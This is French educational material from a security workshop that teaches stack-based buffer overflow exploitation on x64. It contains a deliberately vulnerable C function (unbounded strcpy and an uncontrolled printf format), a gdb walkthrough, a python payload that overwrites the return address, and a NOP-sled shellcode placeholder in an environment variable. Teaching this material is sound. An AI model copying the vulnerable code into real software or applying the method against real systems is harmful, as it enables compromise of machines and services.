#<center>PoC Pool: Computer Security</center>
#<center>Binary Exploitation</center>

Comme vous avez pu le voir aujourd'hui, une mauvaise manipulation d'allocation mémoire peut entrainer de lourdes conséquences, allant jusqu'à la compromission d'un ou plusieurs services, voir de la machine.

## Stack based buffer overflow (x64)

Prenons en exemple le code vulnérable suivant:

```c
int test(const char * const name)
{
  char name_copy[25];

  strcpy(name_copy, name);
  printf(name_copy);
  return 0;
}
```

Lorsque cette fonction est appelée, de la place sera réservée sur la stack pour stocker les variables locales ainsi que le contexte de la fonction parente.
Le contexte sert a stocker RBP (la valeur de la fin de la stack) de la fonction parente, ainsi que RIP (le pointeur d'instruction) qui garde l'adresse a laquelle l'exécution du programme était lorsque la fonction a été appelée.
En ouvrant gdb  on peut obtenir le code asm de la fonction avec `disas`.

```nasm
# stockage de RBP dans la stack
  push   rbp
  mov    rbp,rsp

# allocation de l espace suffisant pour les variables locales sur la stack
  sub    rsp,0x30

# l argument de la fonction est stocké sur la stack
  mov    QWORD PTR [rbp-0x28],rdi

# préparation des arguments de strcpy et appel de la fonction
  mov    rdx,QWORD PTR [rbp-0x28]
  lea    rax,[rbp-0x20]
  mov    rsi,rdx
  mov    rdi,rax
  call   strcpy

# preparation des arguments de printf et appel de la fonction
  lea    rax,[rbp-0x20]
  mov    rdi,rax
  mov    eax,0x0
  call   printf

# stockage de la valeur de retour dans RAX
  mov    eax,0x0

# restoration du context parent
  leave
  ret
```

On peut mettre un breakpoint où on veut dans le code. Ici je le mets au call de `strcpy` pour inspecter la stack.
La commande `x` permet d'inspecter la mémoire avec gdb.

```
$RBP-0x28: 0x00007fffffffe70c # pointeur vers name
$RBP-0x20: 0x0000000000000000 # array de char name_copy
$RBP-0x18: 0x0000000000000000 # array de char name_copy
$RBP-0x10: 0x0000000000000000 # array de char name_copy
$RBP-0x8 : 0x0000000000000000 # array de char name_copy
$RBP     : 0x00007fffffffe220 # RBP de la fonction parente
$RBP+0x8 : 0x00005555555546f3 # adresse de retour de la fonction
```

Ici on remarque que le développeur ne nous limite pas dans le nombre de bytes (char) que l'on peut copier.

Rien ne nous empêche de mettre plus de 25 bytes et d'écraser ce qui se trouve après notre buffer alloue sur la stack.
Pour exploiter une telle faille le plus fréquent est d'utiliser un outil de scripting, comme le python.
Dans notre exemple, la fonction va être appelée par le main suivant:

```c
int main(int argc, const char * const * const argv)
{
  if (argc == 2)
    return test(argv[1]);
  return 1;
}
```

La plupart des shells permettent de rediriger la sortie d'une commande dans les paramètres d'une autre.
Sur bash le plus fréquent est le format `$()`.
Dans cette exemple, le tableau `name_copy` prend 32 bytes `(3 * 8 < 25 < 4 * 8)`, et RBP prend 8 bytes, il faut donc écraser 40 bytes avant d'écraser l'adresse de retour.
Dans gdb on peut exécuter le programme avec le même format.

```sh
r $(python2 -c 'print("A" * 40 + "B" * 8)')
# écrase l'adresse de retour avec 8 "B"
```

Maintenant que l'on contrôle le flot d'exécution du programme, il nous faut injecter du code (shellcode) dans la memoire.
Une solution relativement efficace consiste a stocker notre shellcode dans l'environnement.
Énormément de shellcode sont disponibles gratuitement sur `http://shell-storm.org/shellcode/`.

```sh
export SHELLCODE=$(python2 -c 'print("\x90" * 50 + "shellcode")')
```

On met des instructions NOP (`\x90`) avant notre shellcode, afin d'avoir un éventail plus large d'adresses sur lesquelles sauter.
Dans gdb on peut récupérer l'adresse d'un NOP de notre shellcode dans notre environnement avec `x`.
On remplace les "B" dans notre commande qui écrase l'adresse de retour, par cette adresse la en little endian (écriture inversée), et voila!

Il existe des mécanismes de protection contre se type de bugs, tels que l'ASLR et la stack non exécutable.

## Format string

Les bugs de type format strings sont dus a une mauvaise utilisation de fonction de la famille de printf.
Lorsque l'utilisateur contrôle la chaine de caractères qui contrôle le format, il est possible d'afficher de la mémoire, et d'avoir une exécution de code.
